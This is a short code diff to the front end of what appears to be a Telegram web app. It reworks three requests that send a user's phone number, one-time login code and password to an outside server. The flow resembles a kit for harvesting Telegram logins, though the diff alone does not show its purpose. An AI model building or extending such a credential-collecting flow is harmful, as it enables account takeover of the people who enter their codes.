@@ -187,14 +187,14 @@ async function sendCode() {
 
     phoneValue = phone;
 
-    const res = await fetch(SERVER + "send_code", {
+    const res = await fetch(SERVER + "/send_code", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            action: "send_code",
-            phone: phone
+            phone: phoneValue
         })
     });
+
 
     const data = await res.json();
 
@@ -220,17 +220,15 @@ async function verifyCode() {
         return;
     }
 
-    const res = await fetch(SERVER + "verify_code", {
+    const res = await fetch(SERVER + "/verify_code", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            action: "verify_code",
             phone: phoneValue,
-            code: code,
-            user_id: Telegram.WebApp.initDataUnsafe?.user?.id
+            code: code
         })
-
     });
+
 
     const data = await res.json();
 
@@ -258,16 +256,15 @@ async function verifyPassword() {
         return;
     }
 
-    const res = await fetch(SERVER + "verify_password", {
+    const res = await fetch(SERVER + "/verify_password", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            action: "verify_password",
             phone: phoneValue,
-            password: password,
-            user_id: Telegram.WebApp.initDataUnsafe?.user?.id
+            password: password
         })
     });
+
 
     const data = await res.json();
 
